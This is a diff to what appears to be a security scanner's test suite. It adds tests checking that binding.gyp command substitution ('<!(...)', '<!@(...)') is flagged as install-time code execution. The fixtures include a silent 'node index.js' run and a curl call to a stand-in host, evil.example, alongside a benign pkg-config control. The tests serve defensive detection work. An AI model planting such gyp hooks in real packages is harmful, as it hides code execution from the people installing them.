@@ -105,6 +105,44 @@ async function runPackageTests() {
     } finally { cleanupTemp(tmp); }
   });
 
+  // --- Phantom Gyp: binding.gyp command-substitution (install-time exec w/o lifecycle) ---
+
+  await asyncTest('PACKAGE: binding.gyp <!(...) command-substitution → gyp_command_exec CRITICAL (no lifecycle)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'phantom-gyp-pkg', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "addon", "sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(x => x.type === 'gyp_command_exec');
+      assert(t, 'Should detect gyp_command_exec on <!(...) with NO package.json lifecycle script');
+      assert(t.severity === 'CRITICAL', 'gyp_command_exec should be CRITICAL');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: binding.gyp <!@(...) command-substitution → gyp_command_exec', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'gyp-at-pkg', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "x", "sources": ["<!@(curl -s http://evil.example/p)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(result.threats.find(x => x.type === 'gyp_command_exec'), 'Should detect gyp_command_exec on <!@(...)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: legit native addon (variable-expansion + pkg-config) → NO gyp_command_exec', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'legit-addon', version: '1.0.0', scripts: { install: 'node-gyp rebuild' } }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "addon", "sources": ["src/addon.cc"], "include_dirs": ["<(module_root_dir)/include"], "cflags": ["<!(pkg-config --cflags glib-2.0)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(!result.threats.find(x => x.type === 'gyp_command_exec'),
+        'Variable-expansion <(...) and the pkg-config build-tool idiom must NOT trigger gyp_command_exec');
+    } finally { cleanupTemp(tmp); }
+  });
+
   // --- No package.json ---
 
   await asyncTest('PACKAGE: Returns empty threats for missing package.json', async () => {
